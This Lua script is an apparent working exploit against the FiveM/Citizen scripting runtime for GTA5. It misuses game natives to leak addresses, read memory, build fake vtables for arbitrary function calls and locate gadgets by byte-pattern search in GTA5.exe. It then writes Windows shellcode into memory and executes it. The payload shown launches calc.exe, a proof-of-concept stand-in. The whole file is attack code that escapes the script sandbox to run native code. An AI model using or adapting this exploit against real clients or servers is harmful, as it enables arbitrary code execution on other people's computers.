local rp  = string.rep
local fmt = string.format

--[[
-- fn_ret0              xinput1_1.dll+0x7100
-- fn_fcall1            xinput1_1.dll+__DestructExceptionObject 
-- fn_fcall3            GTA5.exe+"40 53 48 83 EC 20 83 79 24 00 48 8B D9 74 22 48 63 51 20 39 51 24"
-- fn_memwrite16        GTA5.exe+"48 8B 41 60 0F 28 80 ? ? ? ? 48 8B C2 0F 29 02 C3"
--]]
local fn_ret0		= nil
local fn_fcall1		= nil
local fn_fcall3		= nil
local fn_memwrite16	= nil

-- pack quadword
function spU64(i)
	return string.pack('<I8', i)
end

-- pack doubleword
function spU32(i)
	return string.pack('<I4', i)
end

-- unpack quadword
function suU64(s)
	return string.unpack('<I8', s)
end

-- unpack doubleword
function suU32(s)
	return string.unpack('<I4', s)
end

function crash()
	Citizen.InvokeNative2(0)
end

function align16(n)
	return (n+0xF) & ~0xF
end

function chkalign16(n)
	if align16(n) ~= n then
		print('chkalign failed')
		crash()
	end
end

function gcb()
	-- _GET_GLOBAL_CHAR_BUFFER
	return Citizen.InvokeNative(0x24DA7D7667FD7B09, Citizen.ResultAsLong())
end

--[[
-- Return the address of Lua string S.
--]]
function straddr(s)
	-- REGISTER_SCRIPT_WITH_AUDIO
	return Citizen.InvokeNative(0xC6ED9D5092438D91, s, Citizen.ResultAsLong(), Citizen.ReturnResultAnyway())
end

--[[
-- Read LEN bytes at AT and return the result as a string.
--]]
function memread(at, len)
	-- REGISTER_SCRIPT_WITH_AUDIO
	return Citizen.InvokeNative(0xC6ED9D5092438D91, 
				    at,                    -- scrString.str
				    len,                   -- scrString.len
				    0xFEED1212,            -- scrString.magic
				    Citizen.ResultAsString(), Citizen.ReturnResultAnyway())
end

--[[
-- (NATIVE)
--
-- Call function at ADDR as if it were virtual and accepted no
-- arguments other than the object THIS, to which EXTRA
-- will be appended after the VFT pointer (+8).
--]]
function fcall0(addr, extra)
	local vft = straddr(rp('\0',8) .. spU64(addr))
	local obj = straddr(spU64(vft) .. extra)
	local arr = straddr(spU64(obj))
	-- word at 0x10 (length) must be greater than 0 (index)
	local pld = straddr(rp('\0',8) .. spU64(arr) .. 'AA')
	-- DATAARRAY_GET_INT
	Citizen.InvokeNative(0x3E5AE19425CD74BE, pld, 0)
end

--[[
-- (XINPUT)
--
-- Call function at ADDR with one arbitrary QWORD argument ARG.
--]]
function fcall1(addr, arg)
	local obj2 = straddr(rp('\0',4) .. spU32(1))
	local obj1 = rp('\0',32) -- [1,4]
		     .. spU64(arg) -- [5]
		     .. spU64(obj2) -- [6]
		     .. spU64(addr-1) -- [7]
	fcall0(fn_fcall1,obj1)
end

--[[
-- (GTA)
--
-- Call function at ADDR as if it were virtual and accepted two
-- arbitrary QWORD arguments ARG2 and ARG3 other than the implicit
-- object THIS, to which EXTRA will be appended after the VFT pointer (+8).
--
-- ARG4 is implicit and zero.
--]]
function fcall3(addr, extra, arg2, arg3)
	--                  0              88             96             128
	local vft = straddr(rp('\0',88) .. spU64(addr) .. rp('\0',32) .. spU64(fn_ret0))
	local obj = straddr(spU64(vft)  .. extra)
	--                  0              8              16             24             32          36
	local p   = straddr(spU64(obj)  .. spU64(arg2) .. rp('\0',8)  .. spU64(arg3) .. spU32(0) .. spU32(1))
	fcall1(fn_fcall3,p)
end

--[[
-- Write octoword VAL at 16-byte aligned address DST.
--]]
function memwrite16_1(dst, val)
	chkalign16(dst)
	local v = straddr('\0\0\0\0\0\0\0\0' .. val)+8
	chkalign16(v)
	local ex = rp('\0',88) .. spU64(v-144)
	fcall3(fn_memwrite16,ex,dst,0)
end

--[[
-- Write string VAL at 16-byte aligned address DST.
--]]
function memwrite16(dst, val)
	chkalign16(dst)
	local v = straddr('\0\0\0\0\0\0\0\0' .. val)+8
	chkalign16(v)
	local i = 0
	local l = #val
	repeat
		local ex = rp('\0',88) .. spU64(v+i-144)
		fcall3(fn_memwrite16,ex,dst+i,0)
		i = i+16
	until i >= l
end

--[[
-- Search for the given byte sequence backwards starting at the specified 
-- address in chunks of 0x1000 bytes each. The byte sequence is expected
-- to be found.
--
-- The size of b must be less than or equal to the chunk size (0x1000) and
-- greater than zero.
--]]
function bytesearch(a, b)
	local bb = {string.byte(b,1,#b)}
	local ri = #bb
	while true do
		local m = memread(a, 0x1000)
		local mb = {string.byte(m,1,#m)}
		local mi = #mb
		while true do
			if mi < 1 then
				break
			end
			if bb[ri] == 0x3F or mb[mi] == bb[ri] then
				ri = ri-1
			elseif ri ~= #bb then
				-- not found, reset search and keep looking in chunk
				ri = #bb
			end
			if ri == 0 then
				-- byte sequence found, take 1 for lua indexing 
				return a + mi - 1
			end
			mi = mi-1
		end
		a = a-0x1000
	end
	return 0
end

-- github.com/peterferrie/win-exec-calc-shellcode
local sh = '\x50\x54\x58\x66\x83\xe4\xf0\x50\x31\xc0\x40\x92\x74\x4f\x60\x4a\x52\x68\x63\x61\x6c\x63\x54\x59\x52\x51\x64\x8b\x72\x30\x8b\x76\x0c\x8b\x76\x0c\xad\x8b\x30\x8b\x7e\x18\x8b\x5f\x3c\x8b\x5c\x3b\x78\x8b\x74\x1f\x20\x01\xfe\x8b\x54\x1f\x24\x0f\xb7\x2c\x17\x42\x42\xad\x81\x3c\x07\x57\x69\x6e\x45\x75\xf0\x8b\x74\x1f\x1c\x01\xfe\x03\x3c\xae\xff\xd7\x58\x58\x61\x5c\x92\x58\xc3\x50\x51\x53\x56\x57\x55\xb2\x60\x68\x63\x61\x6c\x63\x54\x59\x48\x29\xd4\x65\x48\x8b\x32\x48\x8b\x76\x18\x48\x8b\x76\x10\x48\xad\x48\x8b\x30\x48\x8b\x7e\x30\x03\x57\x3c\x8b\x5c\x17\x28\x8b\x74\x1f\x20\x48\x01\xfe\x8b\x54\x1f\x24\x0f\xb7\x2c\x17\x8d\x52\x02\xad\x81\x3c\x07\x57\x69\x6e\x45\x75\xef\x8b\x74\x1f\x1c\x48\x01\xfe\x8b\x34\xae\x48\x01\xf7\x99\xff\xd7\x48\x83\xc4\x68\x5d\x5f\x5e\x5b\x59\x5a\x5c\x58\xc3'
-- GTA5.exe arbitrary .DATA address
local gb = gcb()

local dst = align16(gb+0x100)

-- Set function addresses
fn_ret0         = 0x407100 
fn_fcall1       = 0x409B90 
fn_fcall3       = bytesearch(gb, '\x40\x53\x48\x83\xEC\x20\x83\x79\x24\x00\x48\x8B\xD9\x74\x22\x48\x63\x51\x20\x39\x51\x24')
fn_memwrite16   = bytesearch(gb, '\x48\x8B\x41\x60\x0F\x28\x80????\x48\x8B\xC2\x0F\x29\x02\xC3')

-- Write code
memwrite16(dst, sh)
-- Execute
fcall1(dst, 0)
